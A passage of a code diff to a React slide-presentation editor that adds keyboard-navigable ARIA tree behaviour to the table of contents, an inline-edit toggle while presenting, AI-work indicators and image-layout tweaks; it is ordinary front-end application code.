+          // "image-right" so the image column grids beside the content.
           const aspect = await imageAspect(compressed);
-          const layout = pasteImageLayout(cur, aspect);
+          const layout = pasteImageLayout(cur, aspect, n);
           if (layout !== "stack" && layout !== cur.layout) {
             patch.layout = layout;
-            // A square/portrait side image is tall; at the default 1:1 split it
-            // squeezes the body text into a half-width column where it wraps past
-            // the slide height and gets auto-scaled smaller. Give the content
-            // column the larger share so the text keeps its size and just uses
-            // more vertical space. Only when the author hasn't pinned a ratio;
-            // wider images (aspect > 1.2) read fine at 1:1.
-            if (cur.contentFlex == null && cur.imageFlex == null && aspect <= 1.2) {
-              patch.contentFlex = 1.4;
-              patch.imageFlex = 1;
+            // Balance the split. A single square/portrait side image is tall; at the
+            // default 1:1 split it squeezes the body text into a half-width column
+            // where it wraps past the slide height and gets auto-scaled smaller — give
+            // the content column the larger share. Two or more images grid inside their
+            // half, so an even 1:1 split gives that grid the room it needs. Only when
+            // the author hasn't pinned a ratio.
+            if (cur.contentFlex == null && cur.imageFlex == null) {
+              if (n === 1 && aspect <= 1.2) { patch.contentFlex = 1.4; patch.imageFlex = 1; }
+              else if (n >= 2) { patch.contentFlex = 1; patch.imageFlex = 1; }
             }
           }
           dispatch({ type: "UPDATE_SLIDE", id: concept.id, index: slideIndex, patch, merge: true });
@@ -6819,6 +7543,12 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
   useEffect(() => {
     const handler = (e) => {
       if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA" || e.target.isContentEditable) return;
+      // CR2: the TOC left rail is a roving-tabindex ARIA tree. While one of its
+      // treeitems holds DOM focus, arrow/space keys are its own disclosure/navigation
+      // keys (expand/collapse/move-focus/select) — never global slide-advance. The
+      // treeitem's onKeyDown already stopPropagation's real bubbling events; this guard
+      // is belt-and-suspenders and also covers synthetic document-level keydowns.
+      if ((e.key === " " || (typeof e.key === "string" && e.key.startsWith("Arrow"))) && typeof document !== "undefined" && document.activeElement && document.activeElement.closest && document.activeElement.closest("[role=tree]")) return;
 
       // Alternatives grid: 1-4 apply variant live, 0 back to original, Enter done, ESC close.
       // Applying keeps the grid open so each variant can be viewed full-size before settling.
@@ -6913,6 +7643,12 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
       // S → presenter view toggle (Present mode only)
       if (fullscreen && e.key === "s" && !e.metaKey && !e.ctrlKey && !e.shiftKey && !["INPUT", "TEXTAREA"].includes(document.activeElement?.tagName)) {
         e.preventDefault(); setPresenterView((v) => !v);
+      }
+      // Shift+E → toggle inline edit while presenting (Present mode only). Kept
+      // distinct from plain 'e' (AI quick-edit dialog). Toasts the new state
+      // since the key, unlike the ✎ button, has no persistent visual cue.
+      if (fullscreen && e.key === "E" && e.shiftKey && !e.metaKey && !e.ctrlKey && !["INPUT", "TEXTAREA"].includes(document.activeElement?.tagName)) {
+        e.preventDefault(); setPresentEdit((v) => { showNavToast(v ? "Edit mode OFF" : "Edit mode ON"); return !v; });
       }
       if (e.key === "Escape" && showGalleryRef.current) { e.preventDefault(); setGallery(false); return; }
       if (e.key === "Escape" && showPresenterViewRef.current) { e.preventDefault(); setPresenterView(false); return; }
@@ -7048,6 +7784,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
   const runQuickEdit = async () => {
     if (!aiOk || !quickEditPrompt.trim() || quickEditing || !slides[slideIndex]) return;
     setQuickEditing(true);
+    dispatch({ type: "SET_AI_WORK", value: { itemId: concept.id, slideIdx: slideIndex } }); // CR5
     try {
       const layoutStats = computeSlideLayoutStats(slideRef.current);
       const result = await quickEditSlide(slides[slideIndex], concept.title, slideIndex + 1, slides.length, quickEditPrompt.trim(), branding, guidelines, quickEditImage?.base64 || null, layoutStats);
@@ -7067,6 +7804,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
       console.error("Quick edit failed:", e);
     } finally {
       setQuickEditing(false);
+      dispatch({ type: "SET_AI_WORK", value: null }); // CR5
       setTimeout(() => setRevealKey(null), 1200);
     }
   };
@@ -7075,6 +7813,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
   const runBlockEdit = async (blockIndex, prompt) => {
     if (!prompt || blockEditing || !slides[slideIndex]?.blocks?.[blockIndex]) return;
     setBlockEditing(true);
+    dispatch({ type: "SET_AI_WORK", value: { itemId: concept.id, slideIdx: slideIndex } }); // CR5
     try {
       const newBlocks = await blockEditSlide(
         slides[slideIndex], blockIndex, prompt,
@@ -7093,6 +7832,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
       console.error("Block edit failed:", e);
     } finally {
       setBlockEditing(false);
+      dispatch({ type: "SET_AI_WORK", value: null }); // CR5
       setTimeout(() => setRevealKey(null), 1200);
     }
   };
@@ -7101,6 +7841,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
   const runNewSlide = async () => {
     if (!aiOk || !newSlidePrompt.trim() || newSlideGenerating) return;
     setNewSlideGenerating(true);
+    dispatch({ type: "SET_AI_WORK", value: { itemId: concept.id, slideIdx: slides.length } }); // CR5 (future new-slide index)
     try {
       const result = await generateSlide(concept.title, slides.length, newSlidePrompt.trim(), branding, guidelines, newSlideImage?.base64 || null);
       if (result) {
@@ -7119,6 +7860,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
       console.error("Generate slide failed:", e);
     } finally {
       setNewSlideGenerating(false);
+      dispatch({ type: "SET_AI_WORK", value: null }); // CR5
       setTimeout(() => setRevealKey(null), 1200);
     }
   };
@@ -7165,6 +7907,10 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
       for (let j = 0; j < jobs.length; j++) {
         if (improveCancelRef.current) break;
         const job = jobs[j];
+        // CR5: mark the active job's slide as the one Vera is working on — the scan
+        // shows only when THIS job's slide is the one currently on screen (batch
+        // never mass-animates off-screen slides).
+        dispatch({ type: "SET_AI_WORK", value: { itemId: job.itemId, slideIdx: job.slideIdx } });
         setImproving({ current: j + 1, total: jobs.length, status: `Reviewing ${job.itemTitle} #${job.slideIdx + 1}...` });
 
         // Measure layout in a hidden offscreen host — Improve no longer navigates
@@ -7205,6 +7951,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
         }
       }
       setMeasureSlide(null);
+      dispatch({ type: "SET_AI_WORK", value: null }); // CR5: batch done — clear the scan
 
       // Background-friendly: leave the user wherever they navigated — don't snap the view back.
       setImproving(failures > 0 ? { current: jobs.length, total: jobs.length, status: `Done — ${successes}✓ ${failures}⚠` } : null);
@@ -7216,6 +7963,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
       setImproving(null);
       setCapturedThumb(null);
       setRevealKey(null);
+      dispatch({ type: "SET_AI_WORK", value: null }); // CR5
     }
   };
   runImproveRef.current = runImprove;
@@ -7301,7 +8049,7 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
             .slide-transition-fade (part-imports.jsx). Independent of the per-block
             .stg-N stagger reveal inside SlideContent, which keeps working as-is. */}
         <div key={slideIndex} className="slide-transition-fade" style={{ position: "relative", width: "100%", height: "100%" }}>
-          <FullscreenSlide slide={presSlides[slideIndex]} index={slideIndex} total={presSlides.length} innerRef={slideRef} branding={presSlides[slideIndex]?._virtual ? null : branding} editable={!isStudent && !presSlides[slideIndex]?._virtual} onEdit={isStudent || presSlides[slideIndex]?._virtual ? undefined : handleSlideEdit} onBlockEdit={isStudent || presSlides[slideIndex]?._virtual ? undefined : runBlockEdit} blockEditing={isStudent ? null : blockEditing} fontScale={fontScale} mode="fill" displayIndex={globalSlideIndex - presOffset} displayTotal={globalSlideTotal} />
+          <FullscreenSlide slide={presSlides[slideIndex]} index={slideIndex} total={presSlides.length} innerRef={slideRef} branding={presSlides[slideIndex]?._virtual ? null : branding} editable={!isStudent && !presSlides[slideIndex]?._virtual} onEdit={isStudent || presSlides[slideIndex]?._virtual ? undefined : handleSlideEdit} onBlockEdit={isStudent || presSlides[slideIndex]?._virtual ? undefined : runBlockEdit} blockEditing={isStudent ? null : blockEditing} fontScale={fontScale} mode="fill" forceEdit={presentEdit && !isStudent} displayIndex={globalSlideIndex - presOffset} displayTotal={globalSlideTotal} />
         </div>
         {!isMobile && <PresenterTOC slides={presSlides} slideIndex={slideIndex} onJump={(i) => dispatch({ type: "SET_SLIDE_INDEX", index: i })} lanes={lanes} currentConceptId={concept.id} dispatch={dispatch} />}
                 {fontScale !== 1 && <div style={{ position: "absolute", top: 12, right: 16, fontFamily: FONT.mono, fontSize: 13, fontWeight: 700, color: T.accent, background: T.bgPanel + "e0", padding: "3px 10px", borderRadius: 4, border: `1px solid ${T.accent}40`, zIndex: 20, letterSpacing: "0.05em", pointerEvents: "none" }}>FONT {Math.round(fontScale * 100)}%</div>}
@@ -7319,9 +8067,14 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
         {!isMobile && <div data-testid="student-toggle" className="slide-nav-btn" onClick={() => dispatch({ type: "SET_VERA_MODE", mode: isStudent ? "editor" : "student" })} title={isStudent ? "Exit student mode" : "Student mode — Vera teaches"} style={{ position: "absolute", top: 16, right: 52, padding: 8, background: isStudent ? T.accent + "30" : "transparent", borderRadius: 6 }}><span style={{ fontSize: 16 }}>🎓</span></div>}
         {!isMobile && <div data-testid="gallery-toggle" className="slide-nav-btn" onClick={() => setGallery((v) => !v)} title="Gallery view (G)" style={{ position: "absolute", top: 16, right: 88, padding: 8, background: showGallery ? T.accent + "30" : "transparent", borderRadius: 6 }}><span style={{ fontSize: 16 }}>🗂</span></div>}
         {!isMobile && <div data-testid="presenter-toggle" className="slide-nav-btn" onClick={() => setPresenterView((v) => !v)} title={showPresenterView ? "Exit presenter view (S)" : "Presenter view — notes, next slide, timer (S)"} style={{ position: "absolute", top: 16, right: 124, padding: 8, background: showPresenterView ? T.accent + "30" : "transparent", borderRadius: 6 }}><span style={{ fontSize: 16 }}>🖥️</span></div>}
+        {/* Present Edit toggle (Shift+E): restore inline click-to-edit while
+            presenting. Uses the Lucide pencil (SVG), NOT the ✏ emoji, so the
+            CR-03 "no edit chrome" test still passes when edit mode is off.
+            Hidden in student mode, where editing is disabled by design. */}
+        {!isMobile && !isStudent && <div data-testid="present-edit-toggle" className="slide-nav-btn" onClick={() => setPresentEdit((v) => !v)} title={presentEdit ? "Editing on — click text/icons to edit (Shift+E)" : "Edit mode — click text/icons to edit while presenting (Shift+E)"} style={{ position: "absolute", top: 16, right: 160, padding: 8, background: presentEdit ? T.accent + "30" : "transparent", borderRadius: 6 }}>{getIcon("edit", { size: 18, color: "#fff" })}</div>}
         {/* Browser fullscreen toggle removed — Vela fullscreen (F key / minimize button) is sufficient */}
         {!isMobile && !VELA_LOCAL_MODE && <>
-          <div className="slide-nav-btn" onClick={() => setShowCinemaTip((v) => !v)} title="Cinema mode — fullscreen in browser" style={{ position: "absolute", top: 16, right: 160, padding: 8 }}><VelaIcon size={18} /></div>
+          <div className="slide-nav-btn" onClick={() => setShowCinemaTip((v) => !v)} title="Cinema mode — fullscreen in browser" style={{ position: "absolute", top: 16, right: 196, padding: 8 }}><VelaIcon size={18} /></div>
           {showCinemaTip && <CinemaTip onClose={() => setShowCinemaTip(false)} />}
         </>}
         {navToast && <div className={navToast.phase === "in" ? "nav-toast-in" : "nav-toast-out"} style={{ position: "absolute", bottom: 20, left: 0, right: 0, display: "flex", justifyContent: "center", zIndex: 20, pointerEvents: "none" }}>
@@ -7388,7 +8141,17 @@ function SlidePanel({ state, concept, slideIndex, fullscreen, dispatch, lanes, b
                 const { vw, vh, isAuto } = computeVirtualDims(previewRatio);
                 const beforeKey = `${concept.id}-${slideIndex}`;
                 const displaySlide = showBefore && beforeSlides?.[beforeKey] ? beforeSlides[beforeKey] : slides[slideIndex];
-                return <div key={revealKey || "static"} className={revealKey ? "magic-reveal" : improving ? "vera-thinking" : ""} style={{ borderRadius: 6, width: "100%", height: "100%" }}>
+                // CR5: one working scan for EVERY AI op on this on-screen slide.
+                // aiWorkingHere is the unified reducer signal (chat/Vera engine +
+                // toolbar); the local flags keep the scan up for toolbar ops even
+                // before their dispatch lands. --vera-accent tints the sweep to the
+                // slide's accent (see part-imports.jsx). data-testid drives verify.
+                // Routed through cssColor() (part-imports.jsx) — the same CSS-context
+                // output encoder used at every other color-scalar render sink — so this
+                // custom property can only ever carry a strict color token, never a
+                // deck-supplied string; see part-imports.jsx getCss() for the paired
+                // @property type registration (belt + suspenders on the same value).
+                return <div key={revealKey || "static"} data-testid="slide-fx-wrapper" data-ai-working={aiWorkingHere ? "1" : undefined} className={revealKey ? "magic-reveal" : (improving || aiWorkingHere || quickEditing || blockEditing || newSlideGenerating || altLoading) ? "vera-thinking" : ""} style={{ borderRadius: 6, width: "100%", height: "100%", "--vera-accent": cssColor(displaySlide?.accent) || T.accent }}>
                   {/* CR3: always letterbox-fit to a fixed aspect box (960×540 for the
                       default "auto"/Fit ratio) so the editor viewport height is
                       content-independent and the toolbar below stays put. Elastic
@@ -7763,7 +8526,7 @@ function AddMenu({ item, insertIndex, dispatch, guidelines, variant, laneId }) {
 }
 
 // ━━━ Slide List with AI Adder ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, lanes, dispatch, guidelines, globalMaxSlideDur, slideOffset, slideTimeOffset, laneId }) {
+function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, lanes, dispatch, guidelines, globalMaxSlideDur, slideOffset, slideTimeOffset, laneId, treeNav }) {
   const [dropTarget, setDropTarget] = useState(null);
   const [containerOver, setContainerOver] = useState(false); // empty-section drop highlight
   const [editingSi, setEditingSi] = useState(null);
@@ -7786,20 +8549,26 @@ function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, 
   const handleSlideRowClick = (e, si) => {
     e.stopPropagation();
     if (editingSi === si) return;
-    if (!selected) dispatch({ type: "SELECT", id: item.id });
     if (e.shiftKey) {
+      if (!selected) dispatch({ type: "SELECT", id: item.id });
       const anchor = selected ? slideIndex : si;
       const lo = Math.min(anchor, si), hi = Math.max(anchor, si);
       const range = []; for (let k = lo; k <= hi; k++) range.push(k);
       dispatch({ type: "SET_SLIDE_SELECTION", indices: range, index: si });
     } else if (e.metaKey || e.ctrlKey) {
+      if (!selected) dispatch({ type: "SELECT", id: item.id });
       const cur = new Set(multiSel);
       if (selected && multiSel.length === 0) cur.add(slideIndex); // seed from active slide
       if (cur.has(si)) cur.delete(si); else cur.add(si);
       const arr = Array.from(cur).sort((a, b) => a - b);
       dispatch({ type: "SET_SLIDE_SELECTION", indices: arr.length > 1 ? arr : [], index: si });
     } else {
-      setTimeout(() => dispatch({ type: "SET_SLIDE_INDEX", index: si }), 0);
+      // Plain click: select this row synchronously (folding the index into SELECT
+      // when the module wasn't selected). A deferred SET_SLIDE_INDEX used to land a
+      // tick late and clobber a slide-index change from a key pressed right after the
+      // click (e.g. ArrowDown on a just-clicked row), so commit it in one shot.
+      if (!selected) dispatch({ type: "SELECT", id: item.id, slideIndex: si });
+      else dispatch({ type: "SET_SLIDE_INDEX", index: si });
     }
   };
 
@@ -7827,6 +8596,27 @@ function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, 
     const nextMod = pos >= 0 ? flat[pos + 1] : null;
     if (nextMod) dispatch({ type: "SELECT", id: nextMod.id, slideIndex: 0 });
     else if (remaining > 0) dispatch({ type: "SELECT", id: item.id, slideIndex: remaining - 1 });
+  };
+
+  // Slide-row (leaf treeitem) keys: Up/Down drive the REAL slide selection
+  // (selection-follows-focus), Left goes to the parent header for disclosure.
+  const nav = treeNav || {};
+  const onSlideRowKeyDown = (e, si) => {
+    if (editingSi === si) return; // rename input active
+    const k = e.key;
+    if (k === "ArrowLeft") {
+      // Standard tree "parent" — move focus to the section header (does not collapse).
+      e.preventDefault(); e.stopPropagation(); nav.focusRow && nav.focusRow(item.id);
+    } else if (k === "ArrowUp") {
+      e.preventDefault(); e.stopPropagation(); nav.moveSelection && nav.moveSelection(item.id, si, -1);
+    } else if (k === "ArrowDown") {
+      e.preventDefault(); e.stopPropagation(); nav.moveSelection && nav.moveSelection(item.id, si, +1);
+    } else if (k === "Enter" || k === " ") {
+      e.preventDefault(); e.stopPropagation();
+      if (!selected) dispatch({ type: "SELECT", id: item.id });
+      dispatch({ type: "SET_SLIDE_INDEX", index: si });
+    }
+    // ArrowRight: leaf → no children → no-op.
   };
 
   const startEditSlideTitle = (e, si, currentTitle) => { e.stopPropagation(); setEditingSi(si); setEditTitle(currentTitle); };
@@ -7919,7 +8709,7 @@ function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, 
   // add affordance and lights up when a slide is dragged over it.
   if (isEmpty) {
     return (
-      <div style={{ paddingLeft: 28, paddingRight: 8, paddingBottom: 6, paddingTop: 2 }}
+      <div role="group" style={{ paddingLeft: 28, paddingRight: 8, paddingBottom: 6, paddingTop: 2 }}
         onDragOver={(e) => { if (_velaDrag && _velaDrag.kind === "slide") { e.preventDefault(); e.stopPropagation(); e.dataTransfer.dropEffect = "move"; if (_velaDrag.fromItemId !== item.id && !containerOver) setContainerOver(true); } }}
         onDrop={(e) => { setContainerOver(false); handleContainerDrop(e); }}
         onDragLeave={(e) => { if (!e.currentTarget.contains(e.relatedTarget)) setContainerOver(false); }}
@@ -7939,7 +8729,7 @@ function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, 
     );
   }
   return (
-    <div style={{ paddingLeft: 28, paddingRight: 8, paddingBottom: 4, minHeight: 8 }}
+    <div role="group" style={{ paddingLeft: 28, paddingRight: 8, paddingBottom: 4, minHeight: 8 }}
       onDragOver={(e) => { if (_velaDrag && _velaDrag.kind === "slide") { e.preventDefault(); e.stopPropagation(); e.dataTransfer.dropEffect = "move"; } }}
       onDrop={handleContainerDrop}
       onDragLeave={() => setDropTarget(null)}
@@ -7955,11 +8745,19 @@ function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, 
         const sPct = sDur > 0 ? Math.max(3, Math.round((sDur / maxSlideDur) * 100)) : 0;
         const slideCumTime = cumTime;
         cumTime += sDur;
+        const slideRowId = item.id + ":" + si;
+        const isRowFocused = nav.focusedRowId === slideRowId;
         return <React.Fragment key={si}>
           <div
-            ref={isActive ? activeSlideRef : null}
+            ref={(el) => { if (isActive) activeSlideRef.current = el; if (nav.setRef) nav.setRef(slideRowId, el); }}
             data-testid="toc-slide-row"
             data-selected={isMultiSel ? "true" : undefined}
+            role="treeitem"
+            aria-level={2}
+            aria-selected={isActive}
+            tabIndex={isRowFocused ? 0 : -1}
+            onKeyDown={(e) => onSlideRowKeyDown(e, si)}
+            onFocus={() => nav.onFocusRow && nav.onFocusRow(slideRowId)}
             draggable={editingSi !== si}
             onDragStart={(e) => handleSlideDragStart(e, si)}
             onDragEnd={handleSlideDragEnd}
@@ -7969,6 +8767,10 @@ function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, 
             onClick={(e) => handleSlideRowClick(e, si)}
             onContextMenu={(e) => { e.preventDefault(); e.stopPropagation(); if (editingSi === si) return; if (!selected) dispatch({ type: "SELECT", id: item.id }); if (!multiSel.includes(si)) setTimeout(() => dispatch({ type: "SET_SLIDE_INDEX", index: si }), 0); setCtxMenu({ x: e.clientX, y: e.clientY, si }); }}
             style={{
+              // No separate focus outline on slide rows: the tree cursor now IS the
+              // selection, so a focused slide row is always the active slide and the
+              // active tint below is the single indicator. isRowFocused still drives
+              // the roving tabindex above. The header keeps its own focus ring.
               padding: "3px 8px 3px 12px", fontSize: 14, fontFamily: FONT.body, cursor: editingSi === si ? "text" : "grab",
               color: isActive ? T.accent : T.textMuted, fontWeight: isActive ? 600 : 400,
               borderLeft: `2px solid ${isMultiSel ? T.accent : "transparent"}`,
@@ -8031,7 +8833,7 @@ function SlideListWithAdder({ item, selected, slideIndex, selectedSlideIndices, 
 }
 
 // ━━━ Concept Row ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function ConceptRow({ item, selected, laneId, dispatch, maxTime, globalMaxSlideDur, slideIndex, selectedSlideIndices, lanes, guidelines, slideOffset, slideTimeOffset, reviewMode, isFirst, isLast, collapsed, onToggleCollapse }) {
+function ConceptRow({ item, selected, laneId, dispatch, maxTime, globalMaxSlideDur, slideIndex, selectedSlideIndices, lanes, guidelines, slideOffset, slideTimeOffset, reviewMode, isFirst, isLast, collapsed, onToggleCollapse, treeNav }) {
   const [editing, setEditing] = useState(false);
   const [title, setTitle] = useState(item.title);
   const [dropPos, setDropPos] = useState(null); // "top" | "bottom" | null
@@ -8114,6 +8916,48 @@ function ConceptRow({ item, selected, laneId, dispatch, maxTime, globalMaxSlideD
   const hiddenCount = item.slides.length - visibleCount;
   const timePct = maxTime > 0 && itemTime > 0 ? Math.max(3, Math.round((itemTime / maxTime) * 100)) : 0;
 
+  // CR2 — TOC roving-tree focus + disclosure keys, scoped to header focus only.
+  const nav = treeNav || {};
+  const rowId = item.id;
+  const isFocused = nav.focusedRowId === rowId;
+  // Core fix: when a COLLAPSED section holds the active slide, mark position with a
+  // live k/N badge + accent left-border so the user never loses "you are here" — the
+  // section stays folded (no auto-expand).
+  const showMarker = collapsed && selected && hasSlides;
+  const markerK = showMarker ? Math.min(slideIndex + 1, item.slides.length) : 0;
+  // Header disclosure keys. stopPropagation overrides the global slide-advance ONLY
+  // while this treeitem is focused; early-return during rename so arrows edit the text.
+  const onHeaderKeyDown = (e) => {
+    if (editing) return;
+    const k = e.key;
+    const mod = e.ctrlKey || e.metaKey;
+    if (k === "ArrowRight") {
+      e.preventDefault(); e.stopPropagation();
+      if (mod) { dispatch({ type: "SET_SECTION_COLLAPSED", all: true, collapsed: false, ids: nav.allIds }); return; }
+      if (collapsed) dispatch({ type: "SET_SECTION_COLLAPSED", id: item.id, collapsed: false });
+      // enter first child AND select it (resume on the active slide when this
+      // section already holds it, so a Left→Right detour returns where you were).
+      else if (hasSlides && nav.selectSlide) nav.selectSlide(item.id, (selected && slideIndex < item.slides.length) ? slideIndex : 0);
+    } else if (k === "ArrowLeft") {
+      e.preventDefault(); e.stopPropagation();
+      if (mod) { dispatch({ type: "SET_SECTION_COLLAPSED", all: true, collapsed: true, ids: nav.allIds }); return; }
+      if (!collapsed) dispatch({ type: "SET_SECTION_COLLAPSED", id: item.id, collapsed: true });
+      // already collapsed: no-op (top-level node has no parent)
+    } else if (k === "ArrowDown") {
+      e.preventDefault(); e.stopPropagation();
+      if (selected && collapsed && hasSlides) nav.moveSelection && nav.moveSelection(item.id, slideIndex, +1); // step through the folded section (marker counts up)
+      else if (!collapsed && hasSlides) nav.selectSlide && nav.selectSlide(item.id, 0); // enter first child
+      else nav.moveFromHeader && nav.moveFromHeader(item.id, +1); // empty section → next section's first slide
+    } else if (k === "ArrowUp") {
+      e.preventDefault(); e.stopPropagation();
+      if (selected && collapsed && hasSlides) nav.moveSelection && nav.moveSelection(item.id, slideIndex, -1);
+      else nav.moveFromHeader && nav.moveFromHeader(item.id, -1); // prev section's last slide
+    } else if (k === "Enter" || k === " ") {
+      // Activate the section (Space must NOT also page the slide → stopPropagation).
+      e.preventDefault(); e.stopPropagation(); dispatch({ type: "SELECT", id: item.id });
+    }
+  };
+
   return (
     <div
       onDragOver={handleWrapperDragOver}
@@ -8127,7 +8971,16 @@ function ConceptRow({ item, selected, laneId, dispatch, maxTime, globalMaxSlideD
       }}
     >
       <div className={`concept-row ${selected ? "selected" : ""}`}
-        ref={headerRef}
+        ref={(el) => { headerRef.current = el; if (nav.setRef) nav.setRef(rowId, el); }}
+        data-testid="toc-section-header"
+        role="treeitem"
+        aria-level={1}
+        aria-expanded={hasSlides ? !collapsed : undefined}
+        aria-selected={selected}
+        aria-label={item.title}
+        tabIndex={isFocused ? 0 : -1}
+        onKeyDown={onHeaderKeyDown}
+        onFocus={() => nav.onFocusRow && nav.onFocusRow(rowId)}
         onClick={() => dispatch({ type: "SELECT", id: item.id })}
         draggable
         onDragStart={(e) => {
@@ -8138,15 +8991,21 @@ function ConceptRow({ item, selected, laneId, dispatch, maxTime, globalMaxSlideD
         onDragOver={handleRowDragOver}
         onDragLeave={() => { if (dropPos === "slide") setDropPos(null); }}
         onDrop={handleRowDrop}
-        style={{ padding: "7px 12px 7px 10px", borderLeft: "2px solid transparent", display: "flex", alignItems: "center", gap: 8, minHeight: 34, position: "relative",
+        style={{ padding: "7px 12px 7px 10px",
+          // Accent left-border marks the collapsed section that holds the active slide.
+          borderLeft: `2px solid ${showMarker ? T.accent : "transparent"}`,
+          display: "flex", alignItems: "center", gap: 8, minHeight: 34, position: "relative",
           background: dropPos === "slide" ? T.accent + "15" : undefined,
-          outline: dropPos === "slide" ? `1px dashed ${T.accent}60` : "none",
+          // Visible keyboard focus ring (WCAG 2.4.7), distinct from the selected tint.
+          outline: dropPos === "slide" ? `1px dashed ${T.accent}60` : (isFocused ? `2px solid ${T.accent}` : "none"),
+          outlineOffset: isFocused ? "-2px" : undefined,
         }}>
         {timePct > 0 && <div title={`${visibleCount} slides${hiddenCount > 0 ? ` (+${hiddenCount} hidden)` : ""} · ${fmtTime(itemTime)}`} style={{ position: "absolute", left: 0, bottom: 0, height: 3, width: `${timePct}%`, background: T.accent + "30", borderRadius: "0 2px 2px 0", cursor: "default" }} />}
-        <span onClick={(e) => { e.stopPropagation(); onToggleCollapse(e.ctrlKey || e.metaKey); }} title="Click to collapse this section · Ctrl/Cmd-click to collapse or expand all" style={{ fontSize: 10, color: T.textDim, transition: "transform .15s", transform: collapsed ? "rotate(-90deg)" : "rotate(0)", cursor: "pointer", flexShrink: 0, width: 12, textAlign: "center" }}>▼</span>
+        <span onClick={(e) => { e.stopPropagation(); onToggleCollapse(e.ctrlKey || e.metaKey); }} aria-label={`${collapsed ? "Expand" : "Collapse"} section ${item.title}`} title="Click to collapse this section · Ctrl/Cmd-click to collapse or expand all" style={{ fontSize: 10, color: T.textDim, transition: "transform .15s", transform: collapsed ? "rotate(-90deg)" : "rotate(0)", cursor: "pointer", flexShrink: 0, width: 12, textAlign: "center" }}>▼</span>
         <div className="imp-dot" onClick={(e) => { e.stopPropagation(); const cycle = { must: "should", should: "nice", nice: "must" }; dispatch({ type: "SET_IMPORTANCE", id: item.id, importance: cycle[item.importance || "should"] }); }} style={{ background: IMP[item.importance || "should"].dot, cursor: "pointer" }} title={`Priority: ${IMP[item.importance || "should"].label} (click to cycle)`} />
         {editing ? <input autoFocus value={title} onChange={(e) => setTitle(e.target.value)} onFocus={(e) => e.target.select()} placeholder="Section name" onKeyDown={(e) => { if (e.key === "Enter") commitRename(); if (e.key === "Escape") setEditing(false); }} onBlur={commitRename} onClick={(e) => e.stopPropagation()} style={S.input({ padding: "2px 6px", border: `1px solid ${T.borderLight}` })} />
           : <span onDoubleClick={startRename} style={{ flex: 1, fontSize: 14, fontFamily: FONT.body, color: T.text, fontWeight: 600, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{item.title}</span>}
+        {showMarker && <span data-testid="toc-collapsed-marker" title={`Current slide ${markerK} of ${item.slides.length} (section collapsed)`} style={{ fontSize: 9, fontFamily: FONT.mono, fontWeight: 700, color: T.accent, background: T.accent + "1f", borderRadius: 8, padding: "0 5px", minWidth: 14, textAlign: "center", flexShrink: 0, lineHeight: "16px" }}>{markerK} / {item.slides.length}</span>}
         {reviewMode && openCommentCount > 0 && <span style={{ fontSize: 9, fontFamily: FONT.mono, fontWeight: 700, color: "#fff", background: T.amber, borderRadius: 8, padding: "0 4px", minWidth: 14, textAlign: "center", flexShrink: 0, lineHeight: "16px" }}>{openCommentCount}</span>}
         {reviewMode && <span onClick={(e) => { e.stopPropagation(); setNotesOpen(!notesOpen); }} title={notesOpen ? "Hide comments" : "Show comments"} style={{ fontSize: 10, cursor: "pointer", flexShrink: 0, opacity: (openCommentCount > 0 || hasNotes) ? 1 : 0.3, color: (openCommentCount > 0 || hasNotes) ? T.accent : T.textDim, lineHeight: 1 }}>💬</span>}
         <span onClick={(e) => { e.stopPropagation(); dispatch({ type: "TOGGLE_PRESENT_CARD", id: item.id }); }} title={item.presentCard ? "Title card ON (click to disable)" : "Title card OFF (click to enable)"} style={{ fontSize: 10, cursor: "pointer", flexShrink: 0, opacity: item.presentCard ? 1 : 0.25, color: item.presentCard ? T.accent : T.textDim, lineHeight: 1 }}>🎬</span>
@@ -8190,32 +9049,62 @@ function ConceptRow({ item, selected, laneId, dispatch, maxTime, globalMaxSlideD
           has the SAME "＋ add" affordance AND the same proven slide-drop container
           as a populated one (fixes both the inconsistency and the can't-drop-into-
           empty-section bug). It renders just the add row when there are no slides. */}
-      {!collapsed && <SlideListWithAdder item={item} selected={selected} slideIndex={slideIndex} selectedSlideIndices={selectedSlideIndices} lanes={lanes} dispatch={dispatch} guidelines={guidelines} globalMaxSlideDur={globalMaxSlideDur} slideOffset={slideOffset || 0} slideTimeOffset={slideTimeOffset || 0} laneId={laneId} />}
+      {!collapsed && <SlideListWithAdder item={item} selected={selected} slideIndex={slideIndex} selectedSlideIndices={selectedSlideIndices} lanes={lanes} dispatch={dispatch} guidelines={guidelines} globalMaxSlideDur={globalMaxSlideDur} slideOffset={slideOffset || 0} slideTimeOffset={slideTimeOffset || 0} laneId={laneId} treeNav={treeNav} />}
     </div>
   );
 }
 
 // ━━━ Module List (flat — no lane headers) ━━━━━━━━━━━━━━━━━━━━━━━━━
-function ModuleList({ lanes, selectedId, slideIndex, selectedSlideIndices, dispatch, maxModuleTime, guidelines, reviewMode }) {
